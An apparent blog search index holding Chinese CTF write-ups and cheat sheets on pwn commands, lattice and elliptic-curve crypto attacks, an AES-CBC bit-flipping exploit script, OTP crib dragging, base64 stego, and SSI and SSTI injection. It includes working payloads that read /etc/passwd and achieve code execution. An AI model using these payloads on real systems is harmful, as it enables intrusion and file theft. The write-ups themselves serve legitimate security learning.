<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Pwn的基本操作]]></title>
    <url>%2F2019%2F07%2F15%2FPwn%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介本文主要是记录一些Pwn的基本操作的命令 基本内容查找gadgets和string123ROPgadget --binary xxx --only 'pop|ret' | grep 'xxx'ROPgadget --binary xxx --string '/bin/sh' ROPgadget --binary xxx --only 'int' execve(“/bin/sh”,NULL,NULL) 的shellcode 123456789shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',])) 关闭ASLR 1sudo sh -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space" gdb下寻找偏移 123pattern create 100pattern offset xxxxxxpattern search ldd 1ldd xxx objdump读取plt表和got表 12objdump -d -j .plt xxxobjdump -R xxx gdb中的print和x 1234567print $esp:打印esp的值x/10x $esp：打印出10个从esp开始的值x/10x $esp-4：打印出10个从偏移4开始的值x/10gx $esp：以64位格式打印 readelf查看段地址 1readelf -S xxx vmmap查看地址是否可读可写可执行1vmmap one_gadget使用1one_gadget /lib/x86_64-linux-gnu/libc.so.6 gdb attach123from pwnlib import *context.terminal = ['gnome-terminal','-x','sh','-c']gdb.attach(p)]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 TAMUCTF Crypto]]></title>
    <url>%2F2019%2F03%2F01%2F2019-TAMUCTF-Crypto%2F</url>
    <content type="text"><![CDATA[简介2019的TAMUCTF总体来说比较适合入门CTF，题目难度不算太高，不过密码的这两道题也算是我没有怎么接触过的加密，分别是背包加密和ECDH。 Holey Knapsack题目描述 My knapsack has a hole in itCipher text: 11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9Public key: {99, 1235, 865, 990, 5, 1443, 895, 1477}The flag is slightly off format.Difficulty: medium 解题思路通过题目我们也可以知道这是背包加密的题目，背包加密在提出后被发现明显的数学缺陷，从而并未成为实用的加密方式。具体的加密过程和攻击方法详见CTF wiki 解题代码可以直接使用wiki中的代码，不过注意的是encoded需要将密文分组分别读入，4个16进制数为一组12345678910111213141516171819202122232425262728293031323334353637import binascii# open the public key and strip the spaces so we have a decent arrayfileKey = open("pub.Key", 'rb')pubKey = fileKey.read().replace(' ', '').replace('L', '').strip('[]').split(',')nbit = len(pubKey)# open the encoded messagefileEnc = open("enc.txt", 'rb')encoded = fileEnc.read().split(" ")for e in encoded: # create a large matrix of 0's (dimensions are public key length +1) A = Matrix(ZZ, nbit + 1, nbit + 1) # fill in the identity matrix for i in xrange(nbit): A[i, i] = 1 # replace the bottom row with your public key for i in xrange(nbit): A[i, nbit] = pubKey[i] # last element is the encoded message A[nbit, nbit] = -int(e) res = A.LLL() for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print i, M M = ''.join(str(j) for j in M) # remove the last bit M = M[:-1] M = hex(int(M, 2))[2:-1] print M 参考资料https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/knapsack/knapsack/https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaichttps://nrich.maths.org/2199 Mike’s Marvelous Mystery Curves题目描述 Mike, the System Administrator, thought it would be a good idea to implement his own Elliptic Curve Diffie Hellman key exchange using unnamed curves to use across the network. We managed to capture network traffic of the key exchange along with an encrypted file transfer. See if you can read the contents of that file.Note: The password to the AES192-CBC encrypted file is the shared key x and y coordinates from the key exchange concatenated together. (e.g. sharedKey = (12345,67890) password = “1234567890”)Difficulty: hardEdit: 02/23/2019 14:33 Changed AES256-CBC to AES192-CBC 解题思路题目给了pcap包，从里面可以提取两张证书和文件，证书是用于ECDH密钥交换的，其中比较有用的部分如下： 1234567891011121314151617Subject Public Key Info: Public Key Algorithm: id-ecPublicKey Public-Key: 196393473219 35161195210 ASN1 OID: badPrime96v4 CURVE: JustNo Field Type: prime-field Prime: 412220184797 A: 10717230661382162362098424417014722231813 B: 22043581253918959176184702399480186312 Generator: 56797798272 349018778637 1234567891011121314151617Subject Public Key Info: Public Key Algorithm: id-ecPublicKey Public-Key: 61801292647 228288385004 ASN1 OID: badPrime96v4 CURVE: JustNo Field Type: prime-field Prime: 412220184797 A: 10717230661382162362098424417014722231813 B: 22043581253918959176184702399480186312 Generator: 56797798272 349018778637 其中ASN1 OID: badPrime96v4说明我们应该攻击这个weak curve，并且我们可以得到椭圆曲线的信息，包括M、A、B以及P：1234M = 412220184797A = 10717230661382162362098424417014722231813B = 22043581253918959176184702399480186312P = (56797798272,349018778637) 从Public-Key我们可以获得Q1和Q2：12Q1 = (61801292647,228288385004)Q2 = (196393473219,35161195210) 则我们可以通过Pohlig-Hellman攻击进行攻击，具体参照这篇文章。从而我们可以得到交换的密钥，最后通过aes-192-cbc解密文件 解题代码sage脚本解出交换的密钥：123456789101112131415161718192021222324252627M = 412220184797A = 10717230661382162362098424417014722231813B = 22043581253918959176184702399480186312P = (56797798272,349018778637)Q1 = (61801292647,228288385004)Q2 = (196393473219,35161195210)F = FiniteField(M)E = EllipticCurve(F,[A,B])P = E.point(P)Q1 = E.point(Q1)Q2 = E.point(Q2)factor(P.order())primes = [8, 3, 1123, 5098207] #The result is from factor(P.order())dlogs = []for fac in primes: t = int(P.order()) / int(fac) dlog = discrete_log(t*Q1,t*P,operation="+") dlogs += [dlog] print("factor"+str(fac)+", Discrete log:"+str(dlog))x = crt(dlogs,primes)print(x*Q2) #Get the (x,y) 然后将x与y拼在一起得到aes的key，之后解密aes-192-cbc就可以得到结果 参考资料https://www.anquanke.com/post/id/159893https://wstein.org/edu/2010/414/projects/novotney.pdfhttps://wiki.openssl.org/index.php/Elliptic_Curve_Diffie_Hellman#ECDH_and_Named_Curveshttps://wiki.openssl.org/index.php/Elliptic_Curve_Diffie_Hellman#Using_ECDH_in_OpenSSL]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
        <tag>ECC</tag>
        <tag>Knapsack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Server-Side Includes (SSI) Injection]]></title>
    <url>%2F2019%2F01%2F27%2FServer-Side-Includes-SSI-Injection%2F</url>
    <content type="text"><![CDATA[简介 SSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。SSI是用于向HTML页面提供动态内容的Web应用程序上的指令。 它们与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI。 可在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。Server-Side Includes攻击允许通过在HTML页面中注入脚本或远程执行任意代码来利用Web应用程序。 一种对于这类漏洞的挖掘方式即是查看.stm，.shtm和.shtml的页面是否存在，但是缺少这些类型的页面并不意味着不存在SSI攻击。 主要用途1、显示服务器端环境变量&lt;#echo&gt;2、将文本内容直接插入到文档中&lt;#include&gt;3、显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)高级SSI可设置变量使用if条件语句 基本格式&lt;!-– 指令名称=”指令参数”&gt;比如：123&lt;!--#exec cmd="cat /etc/passwd"--&gt;&lt;!--#include file="included.html" --&gt;&lt;!--#echo reqheader="referer" --&gt; 说明:1．是HTML语法中表示注释，当WEB服务器不支持SSI时，会忽略这些信息。2．#exec 为SSI指令之一。3．cmd 为exec的参数, cat /etc/passwd为参数值，在本指令中指将要执行的命令。 注意: 1．&lt;!–与#号间无空格，只有SSI指令与参数间存在空格。2．上面的标点=””，一个也不能少。3．SSI指令是大小写敏感的，因此参数必须是小写才会起作用。 因此，如果网站存在SSI漏洞的时候就会能够执行该命令来查看系统口令。 使用环境什么情况下服务器可以解析shtml文件呢？以Apache Httpd为例，开启SSI需要支持include这个module：1LoadModule include_module /usr/lib/apache2/modules/mod_include.so1 同时，在配置Web目录的时候，还要使用 +Includes 指令开启这个功能1234&lt;Directory /var/www/&gt; Options -Indexes +Includes AllowOverride All &lt;/Directory&gt; 另外，如果要SSI要支持exec命令，还需要开启cgi或cgid123LoadModule cgid_module /usr/lib/apache2/modules/mod_cgid.so # 或者 LoadModule cgi_module /usr/lib/apache2/modules/mod_cgi.so 此时，我们上传的shtml即可成功利用 摘要该文章主要从P神的知识星球和该博客进行搬运，如有不妥可联系我进行删除]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCON Quals 2017 - Secret Server]]></title>
    <url>%2F2019%2F01%2F25%2FHITCON-Quals-2017-Secret-Server%2F</url>
    <content type="text"><![CDATA[该WP是对此WP的学习和补充，也顺便搬运一下 题目信息 AES is unbreakable. Right?We are given this python script. 解题思路Server源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import os, base64, time, random, stringfrom Crypto.Cipher import AESfrom Crypto.Hash import *key = os.urandom(16)def pad(msg): pad_length = 16-len(msg)%16 return msg+chr(pad_length)*pad_lengthdef unpad(msg): return msg[:-ord(msg[-1])]def encrypt(iv,msg): msg = pad(msg) cipher = AES.new(key,AES.MODE_CBC,iv) encrypted = cipher.encrypt(msg) return encrypteddef decrypt(iv,msg): cipher = AES.new(key,AES.MODE_CBC,iv) decrypted = cipher.decrypt(msg) decrypted = unpad(decrypted) return decrypteddef send_msg(msg): iv = '2jpmLoSsOlQrqyqE' encrypted = encrypt(iv,msg) msg = iv+encrypted msg = base64.b64encode(msg) print msg returndef recv_msg(): msg = raw_input() try: msg = base64.b64decode(msg) assert len(msg)&lt;500 decrypted = decrypt(msg[:16],msg[16:]) return decrypted except: print 'Error' exit(0)def proof_of_work(): proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in xrange(20)]) digest = SHA256.new(proof).hexdigest() print "SHA256(XXXX+%s) == %s" % (proof[4:],digest) x = raw_input('Give me XXXX:') if len(x)!=4 or SHA256.new(x+proof[4:]).hexdigest() != digest: exit(0) print "Done!" returnif __name__ == '__main__': proof_of_work() with open('flag.txt') as f: flag = f.read().strip() assert flag.startswith('hitcon&#123;') and flag.endswith('&#125;') send_msg('Welcome!!') while True: try: msg = recv_msg().strip() if msg.startswith('exit-here'): exit(0) elif msg.startswith('get-flag'): send_msg(flag) elif msg.startswith('get-md5'): send_msg(MD5.new(msg[7:]).digest()) elif msg.startswith('get-time'): send_msg(str(time.time())) elif msg.startswith('get-sha1'): send_msg(SHA.new(msg[8:]).digest()) elif msg.startswith('get-sha256'): send_msg(SHA256.new(msg[10:]).digest()) elif msg.startswith('get-hmac'): send_msg(HMAC.new(msg[8:]).digest()) else: send_msg('command not found') except: exit(0) 首先阅读源码，我们可以发现服务器大概有以下几个功能1.get-flag，get-md5, get-sha1, get-sha256, get-hmac,get-time.分别会返回如它们名字的东西2.如果发送的命令不在1中，则返回command not found3.服务器会在一开始给我们一个AES加密字符串Welcome!!的密文以及IV 当然服务器并没有给我们AES加密的key，并且我们发送给服务器的命令是需要在AES解密之后才能执行的。执行条件也就是用明文头匹配功能1中的功能，如果是get-md5,get-sha1等命令会把明文的剩下部分当作参数进行操作。 我们也可以从源码中获取几点有用的信息：1.flag以hitcon{开头，以}结尾2.我们知道一开始给的加密的Welcome!!的IV以及加密后的结果3.unpad方法只是单纯的截取字符，并没有进行检查。我们可以控制截取字符4.AES加密的形式是CBC AES CBC解密原理如下图 我们来分析以下左边的第一个块，即开头的块。假设密文C0经过key解密之后的中间值为X0，X0异或IV之后的结果为P0，则我们可以得到： X0 ^ IV = P0 如果我们需要将解密之后的结果改为P1，我们可以这么做 X0 ^ IV ^ P0 = 1X0 ^ IV ^ P0 ^ P1 = P1X0 ^ (IV ^ P0 ^ P1) = P1 也就是将IV异或P0再异或P1就可以了 我们可以将此方法抽象出来供后面使用:12345678def xor_str(s1, s2): '''XOR between two strings. The longer one is truncated.''' return ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(s1, s2))def flipiv(oldplain, newplain, iv): '''Modifies an IV to produce the desired new plaintext in the following block''' flipmask = xor_str(oldplain, newplain) return xor_str(iv, flipmask) 在这道题中我们的P0对应Welcome!!，P1我们可以设为get-flag，则我们可以先获取get-flag命令的返回值12345678910111213141516171819HOST = '52.193.157.19'PORT = 9999welcomeplain = pad('Welcome!!')p = remote(HOST, PORT)solve_proof(p)# get welcomewelcome = p.recvline(keepends=False)print 'Welcome:', welcomewelcome_dec = base64.b64decode(welcome)welcomeblocks = blockify(welcome_dec, 16)# get encrypted flagpayload = flipiv(welcomeplain, 'get-flag'.ljust(16, '\x01'), welcomeblocks[0])payload += welcomeblocks[1]p.sendline(base64.b64encode(payload))flag = p.recvline(keepends=False)print 'Flag:', flag 我们得到了解密后的flag，但是这显然是不够的，我们需要获得解密后的flag 现在回过头看看我们知道的东西，我们知道flag是以hitcon{开头的。那么如果我们用上一步的方法，将hitcon{换为相同长度的get-md5，会发生什么呢？ command: get-md5XXX 其中XXX为除去hitcon{开头的flag，也就是得到剩下的flag的md5加密之后的结果再进行AES加密的结果 1234567flag_dec = base64.b64decode(flag)flagblocks = blockify(flag_dec, 16)flaglen = len(flag_dec) - 16payload = flipiv('hitcon&#123;'.ljust(16, '\x00'), 'get-md5'.ljust(16,'\x00'), flagblocks[0])payload += ''.join(flagblocks[1:])other_flag_md5 = p.sendline(base64.b64encode(payload))print 'Other_Flag_MD5:', other_flag_md5 并且由于unpad的不安全性，我们或许可以将flag截取出来前面的几位，这取决于我们想要它的前几位 现在我们需要解决的问题变为了两个:1.如何通过unpad方法截取flag2.截取的flag被md5加密以及AES加密之后我们怎么验证它是多少 首先我们来解决第一个问题。由于AES-CBC模式解密的时候是用前一个密文块去解密后一个密文块的(除了第一个块是用IV)，我们可以将flipiv方法用在之后的块上。比如我们可以在other_flag_md5的基础上在payload后面加上我们一开始得到的welcomeblocks，并用我们运行get-flag命令的方法截断flag，即1234567891011def getmd5enc(i): '''Returns the md5 hash of the flag cut at index i, encrypted with AES and base64 encoded''' # replace beginning of flag with 'get-md5' payload = flipiv('hitcon&#123;'.ljust(16, '\x00'), 'get-md5'.ljust(16, '\x00'), flagblocks[0]) payload += ''.join(flagblocks[1:]) # add a block where we control the last byte, to unpad at the correct length ('hitcon&#123;' + i characters) payload += flipiv(welcomeplain, 'A'*15 + chr(16 + 16 + flaglen - 7 - 1 - i), welcomeblocks[0]) payload += welcomeblocks[1] p.sendline(base64.b64encode(payload)) md5b64 = p.recvline(keepends=False) return md5b64 这样我们就可以截取flag中hitcon{后面的任意位字符了(当然我们可以随便发送给服务器指令，我们便会收到加密后的command not found，可以像利用Welcome!!一样利用它，不过好像也是多此一举) 接下来我们解决第二个问题。我们首先捕捉getmd5enc方法得到的数据123# get md5 ciphertext for the flag up to index inewmd5 = getmd5enc(i)md5blocks = blockify(base64.b64decode(newmd5), 16) 该题中MD5加密之后的结果都是16位，并且MD5加密无论输入有多长输出都是固定的位数。我们可以一个字符一个字符的爆破MD5值，记为guess_md5。之后我们可以将guess_md5,pad(get-time)以及md5blocks[0]三个参数传入flipiv方法。如果返回command not found则爆破失败，如果获取其他数据则成功。即1234567891011121314151617181920known_flag = ''for guess in range(256): # locally compute md5 hash guess_md5 = MD5.new(known_flag + chr(guess)).digest() # try to null out the md5 plaintext and execute a command payload = flipiv(guess_md5, 'get-time'.ljust(16, '\x01'), md5blocks[0]) payload += md5blocks[1] payload += md5blocks[2] # padding block p.sendline(base64.b64encode(payload)) res = p.recvline(keepends=False) # if we receive the block for 'command not found', the hash was wrong if res == notfound: print 'Guess &#123;&#125; is wrong.'.format(guess) # otherwise we correctly guessed the hash and the command was executed else: print 'Found!' known_flag += chr(guess) print 'Flag so far:', known_flag break 最后便可以得到flag:hitcon{Paddin9_15_ve3y_h4rd__!!} 解题脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109from pwn import *import base64, random, stringfrom Crypto.Hash import MD5, SHA256def pad(msg): pad_length = 16-len(msg)%16 return msg+chr(pad_length)*pad_lengthdef unpad(msg): return msg[:-ord(msg[-1])]def xor_str(s1, s2): '''XOR between two strings. The longer one is truncated.''' return ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(s1, s2))def blockify(text, blocklen): '''Splits the text as a list of blocklen-long strings''' return [text[i:i+blocklen] for i in xrange(0, len(text), blocklen)]def flipiv(oldplain, newplain, iv): '''Modifies an IV to produce the desired new plaintext in the following block''' flipmask = xor_str(oldplain, newplain) return xor_str(iv, flipmask)def solve_proof(p): instructions = p.recvline().strip() suffix = instructions[12:28] print suffix digest = instructions[-64:] print digest prefix = ''.join(random.choice(string.ascii_letters+string.digits) for _ in xrange(4)) newdigest = SHA256.new(prefix + suffix).hexdigest() while newdigest != digest: prefix = ''.join(random.choice(string.ascii_letters+string.digits) for _ in xrange(4)) newdigest = SHA256.new(prefix + suffix).hexdigest() print 'POW:', prefix p.sendline(prefix) p.recvline()HOST = '52.193.157.19'PORT = 9999welcomeplain = pad('Welcome!!')p = remote(HOST, PORT)solve_proof(p)# get welcomewelcome = p.recvline(keepends=False)print 'Welcome:', welcomewelcome_dec = base64.b64decode(welcome)welcomeblocks = blockify(welcome_dec, 16)# get command-not-foundp.sendline(welcome)notfound = p.recvline(keepends=False)print 'Command not found:', notfound# get encrypted flagpayload = flipiv(welcomeplain, 'get-flag'.ljust(16, '\x01'), welcomeblocks[0])payload += welcomeblocks[1]p.sendline(base64.b64encode(payload))flag = p.recvline(keepends=False)print 'Flag:', flagflag_dec = base64.b64decode(flag)flagblocks = blockify(flag_dec, 16)flaglen = len(flag_dec) - 16known_flag = ''def getmd5enc(i): '''Returns the md5 hash of the flag cut at index i, encrypted with AES and base64 encoded''' # replace beginning of flag with 'get-md5' payload = flipiv('hitcon&#123;'.ljust(16, '\x00'), 'get-md5'.ljust(16, '\x00'), flagblocks[0]) payload += ''.join(flagblocks[1:]) # add a block where we control the last byte, to unpad at the correct length ('hitcon&#123;' + i characters) payload += flipiv(welcomeplain, 'A'*15 + chr(16 + 16 + flaglen - 7 - 1 - i), welcomeblocks[0]) payload += welcomeblocks[1] p.sendline(base64.b64encode(payload)) md5b64 = p.recvline(keepends=False) return md5b64for i in range(flaglen - 7): print '-- Character no. &#123;&#125; --'.format(i) # get md5 ciphertext for the flag up to index i newmd5 = getmd5enc(i) md5blocks = blockify(base64.b64decode(newmd5), 16) # try all possible characters for that index for guess in range(256): # locally compute md5 hash guess_md5 = MD5.new(known_flag + chr(guess)).digest() # try to null out the md5 plaintext and execute a command payload = flipiv(guess_md5, 'get-time'.ljust(16, '\x01'), md5blocks[0]) payload += md5blocks[1] payload += md5blocks[2] # padding block p.sendline(base64.b64encode(payload)) res = p.recvline(keepends=False) # if we receive the block for 'command not found', the hash was wrong if res == notfound: print 'Guess &#123;&#125; is wrong.'.format(guess) # otherwise we correctly guessed the hash and the command was executed else: print 'Found!' known_flag += chr(guess) print 'Flag so far:', known_flag breakprint 'hitcon&#123;' + known_flag 总结还是要谢谢大佬的WP，的确学到挺多东西。虽然本文是搬运并加以理解，但是不得不承认这题还是有点东西的。这题好像还有个Revenge版，等我有时间再研究下ORZ]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 AlexCTF-CR2 Many time secrets]]></title>
    <url>%2F2019%2F01%2F22%2F2017-AlexCTF-CR2-Many-time-secrets%2F</url>
    <content type="text"><![CDATA[简介 This time Fady learned from his old mistake and decided to use onetime pad as his encryption technique, but he never knew why people call it one time pad!msg 解题思路这是一个OTP加密的问题。在题目中给了十几个用同一一次密码本加密的内容，所以我们可以使用many time pad attack (aka crib drag)进行攻击。 具体过程1.参考这篇WP,用cribdrag进行猜测 123456789$ python xorstrings.py 0529242a631234122d2b36697f13272c207f2021283a6b0c7908 2f28202a302029142c653f3c7f2a2636273e3f2d653e252179082a01040053321d06014e09550039011a07411f0c4d044e2d0000$ python cribdrag.py 2a01040053321d06014e09550039011a07411f0c4d044e2d0000Your message is currently:0 __________________________Your key is currently:0 __________________________Please enter your crib: 在进行了一系列猜测后得到： 12345Your message is currently:0 Dear Friend, This time I uYour key is currently:0 nderstood my mistake and uPlease enter your crib: 最后通过xorstrings.py稍加修改进行解密123456s1 = &quot;0529242a631234122d2b36697f13272c207f2021283a6b0c7908&quot;.decode(&apos;hex&apos;)s2 = &quot;Dear Friend, This time I u&quot;s3 = sxor(s1, s2)print s3 得到flag：ALEXCTF {HERE_GOES_THE_KEY} 2.使用脚本进行猜测 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/ # Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"c2 = "2f28202a302029142c653f3c7f2a2636273e3f2d653e25217908"c3 = "322921780c3a235b3c2c3f207f372e21733a3a2b37263b313012"c4 = "2f6c363b2b312b1e64651b6537222e37377f2020242b6b2c2d5d"c5 = "283f652c2b31661426292b653a292c372a2f20212a316b283c09"c6 = "29232178373c270f682c216532263b2d3632353c2c3c2a293504"c7 = "613c37373531285b3c2a72273a67212a277f373a243c20203d5d"c8 = "243a202a633d205b3c2d3765342236653a2c7423202f3f652a18"c9 = "2239373d6f740a1e3c651f207f2c212a247f3d2e65262430791c"c10 = "263e203d63232f0f20653f207f332065262c3168313722367918"c11 = "2f2f372133202f142665212637222220733e383f2426386b"ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to cracktarget_cipher = "2239373d6f740a1e3c651f207f2c212a247f3d2e65262430791c"# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])# To store the final keyfinal_key = [None]*150# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don't xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode('hex'),' '*150) for index in knownSpaceIndexes: # Store the key's value at the correct position final_key[index] = xor_with_spaces[index].encode('hex') # Record that we known the key at this position known_key_positions.add(index)# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)final_key_hex = ''.join([val if val is not None else '00' for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))print "Fix this sentence:"print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+"\n"# WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet# fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good keytarget_plaintext = "cure, Let Me know if you a"print "Fixed:"print target_plaintext+"\n"key = strxor(target_cipher.decode('hex'),target_plaintext)print "Decrypted msg:"for cipher in ciphers: print strxor(cipher.decode('hex'),key)print "\nPrivate key recovered: "+key+"\n" 总结一次密码本如果使用不当还是会有不安全的部分，除此之外还可以使用中间人攻击等方法进行攻击。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCTF-2015 Decode The File]]></title>
    <url>%2F2019%2F01%2F19%2FRCTF-2015-Decode-The-File%2F</url>
    <content type="text"><![CDATA[简介这道题是2015-RCTF的一道密码题，考点有点秀，就记下来了。 题目描述题目给了个cip文件,里面是一行一行的base64加密过的代码，逐行解码之后会得到一个DES加密的python代码。当时我看了很久都没弄懂解码出来的代码有啥用，后来去看了别人的wp才发现还有这种操作。具体就是每行base64加密过的代码解码之后再加密会发现末尾的字母会有变化，而经我测试下来也是如此 其中第一行是原本的明文，第二行是加密之后的base64密文，第三行我将末尾的w改成了y，第四行可以发现我们任然可以解码出原本的明文 而这道题的末尾都经过了这种隐写，最后通过脚本可以直接接出来123456789101112131415161718192021222324252627282930def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('cip', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print res_strsolve_stego() 总结与其说是crypto不如说是stega，太秀了，而且这种隐写方式也出现在国际赛事上许多次，所以还是记录下来好好学习学习。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSTI的一些基本操作]]></title>
    <url>%2F2019%2F01%2F17%2FSSTI%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介记录一下SSTI的一些基本操作，方便以后使用。主要内容转载自该博客 任意文件读取POC123file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。找到file类的索引，在我的环境中&lt;type 'file'&gt;类的索引是40，我们就注入&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;可以通过以下语句绕过一些过滤&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()[40]('/etc/passwd')[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 第一种代码执行POC1234file类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件，然后我们再通过SSTI漏洞第二种代码执行poc调用from_pyfile方法去compile文件并执行其中的内容。这就是一个二次进攻。将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('&lt;malicious code here&gt;') &#125;&#125;注入到SSTI漏洞点，然后在通过注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。 第二种代码执行POC：充分地利用from_pyfile方法。123将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') &#125;&#125;注入到SSTI漏洞点，注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;来将新的项目添加到config对象中，将&#123;&#123; config['RUNCMD']('/usr/bin/id',shell=True) &#125;&#125;注入到SSTI漏洞点。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 NJCTF-Guess]]></title>
    <url>%2F2019%2F01%2F16%2F2017-NJCTF-Guess%2F</url>
